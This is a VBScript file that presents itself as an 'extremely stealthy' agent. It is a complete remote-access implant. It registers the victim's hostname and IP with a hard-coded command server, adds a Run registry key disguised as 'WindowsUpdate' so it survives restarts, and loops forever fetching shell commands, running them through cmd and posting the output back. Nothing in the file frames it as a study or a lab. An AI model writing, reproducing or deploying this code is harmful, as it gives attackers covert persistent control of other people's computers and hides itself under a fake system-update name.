' VBScript Agent - Extremely Stealthy
Option Explicit

Dim ServerURL, AgentID, Hostname, IPAddress
ServerURL = "http://78.70.235.44:5000"
AgentID = CreateObject("Scriptlet.TypeLib").GUID
Hostname = CreateObject("WScript.Network").ComputerName

' Get external IP
On Error Resume Next
Dim HTTP, IP
Set HTTP = CreateObject("MSXML2.ServerXMLHTTP")
HTTP.open "GET", "https://api.ipify.org", False
HTTP.send
If Err.Number = 0 Then
    IPAddress = HTTP.responseText
Else
    IPAddress = "127.0.0.1"
End If
On Error Goto 0

' Add persistence via registry
Dim WSHShell
Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", "wscript.exe //B """ & WScript.ScriptFullName & """", "REG_SZ"

Function RegisterAgent()
    On Error Resume Next
    Dim HTTP, JSON
    Set HTTP = CreateObject("MSXML2.ServerXMLHTTP")
    
    JSON = "{""agent_id"":""" & AgentID & """,""hostname"":""" & Hostname & """,""ip"":""" & IPAddress & """}"
    
    HTTP.open "POST", ServerURL & "/api/register", False
    HTTP.setRequestHeader "Content-Type", "application/json"
    HTTP.send JSON
    
    If Err.Number = 0 And HTTP.status = 200 Then
        RegisterAgent = True
    Else
        RegisterAgent = False
    End If
    On Error Goto 0
End Function

Function ExecuteCommand(Command)
    On Error Resume Next
    Dim WSHShell, Exec
    Set WSHShell = CreateObject("WScript.Shell")
    Set Exec = WSHShell.Exec("cmd /c " & Command)
    
    ExecuteCommand = Exec.StdOut.ReadAll() & Exec.StdErr.ReadAll()
    If Err.Number <> 0 Then ExecuteCommand = "Error: " & Err.Description
    On Error Goto 0
End Function

Function Beacon()
    On Error Resume Next
    Dim HTTP, Tasks, Task, TaskID, Command, Result, ResultJSON
    
    While True
        Set HTTP = CreateObject("MSXML2.ServerXMLHTTP")
        HTTP.open "GET", ServerURL & "/api/tasks/" & AgentID, False
        HTTP.send
        
        If Err.Number = 0 And HTTP.status = 200 Then
            Tasks = HTTP.responseText
            ' Simple JSON parsing (for demonstration)
            If InStr(Tasks, "[{") > 0 Then
                ' Extract commands from JSON response
                Dim Commands, Results
                Commands = Split(Tasks, "{""id"":")
                
                For Each Task in Commands
                    If InStr(Task, """command"":") > 0 Then
                        TaskID = Mid(Task, InStr(Task, """") + 1)
                        TaskID = Left(TaskID, InStr(TaskID, """") - 1)
                        
                        Command = Mid(Task, InStr(Task, """command"":") + 12)
                        Command = Left(Command, InStr(Command, """") - 1)
                        
                        If Len(Command) > 0 Then
                            Result = ExecuteCommand(Command)
                            
                            ' Send result back
                            ResultJSON = "{""task_id"":""" & TaskID & """,""result"":""" & Replace(Result, """", "\""") & """,""agent_id"":""" & AgentID & """}"
                            
                            Set HTTP = CreateObject("MSXML2.ServerXMLHTTP")
                            HTTP.open "POST", ServerURL & "/api/result", False
                            HTTP.setRequestHeader "Content-Type", "application/json"
                            HTTP.send ResultJSON
                        End If
                    End If
                Next
            End If
        End If
        
        WScript.Sleep 30000 ' 30 seconds
    Wend
End Function

' Main execution
While Not RegisterAgent()
    WScript.Sleep 60000
Wend

Call Beacon()